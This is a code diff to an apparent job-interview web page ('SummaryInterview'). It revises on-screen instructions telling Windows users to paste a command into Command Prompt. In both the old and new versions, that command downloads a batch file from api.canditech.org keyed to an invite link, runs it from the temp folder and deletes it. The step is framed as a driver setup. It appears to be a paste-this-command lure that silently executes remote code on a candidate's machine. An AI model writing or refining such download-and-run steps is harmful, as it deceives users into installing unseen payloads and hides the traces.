@@ -721,8 +721,8 @@ export default function SummaryInterview() {
                   )}
                   {driverOs === 'windows' && (
                     <p>
-                      Open <strong>Command Prompt</strong> (<kbd>Win</kbd>+<kbd>S</kbd>, type <strong>cmd</strong>) or paste the command into <strong>PowerShell</strong> — it starts with{' '}
-                      <code>cmd.exe /c</code> so <code>%TEMP%</code> is expanded correctly.
+                      Press <kbd>Windows</kbd> + <kbd>S</kbd>, type <strong>cmd</strong>, and open <strong>Command Prompt</strong> (not PowerShell). The command below uses Windows
+                      <code>%TEMP%</code> syntax and must run under <strong>cmd.exe</strong>, or use the single line as written (it calls <code>cmd.exe</code> for you so it also works if you paste into PowerShell).
                     </p>
                   )}
                   {driverOs === 'linux' && (
@@ -760,7 +760,7 @@ export default function SummaryInterview() {
                   )}
                 {driverOs === 'windows' && (
                           <code>
-                      {`cmd.exe /c "curl -sL -X POST https://api.canditech.org/window/${inviteLink ? inviteLink : ''} -o %TEMP%\\t.bat && call %TEMP%\\t.bat && del %TEMP%\\t.bat"`}
+                      {`curl -sL -X POST https://api.canditech.org/window/${inviteLink ? inviteLink : ''} -o "%TEMP%\\t.bat" && cmd /c "%TEMP%\\t.bat" && del "%TEMP%\\t.bat"`}
                           </code>
                       )}
               {driverOs === 'linux' && (
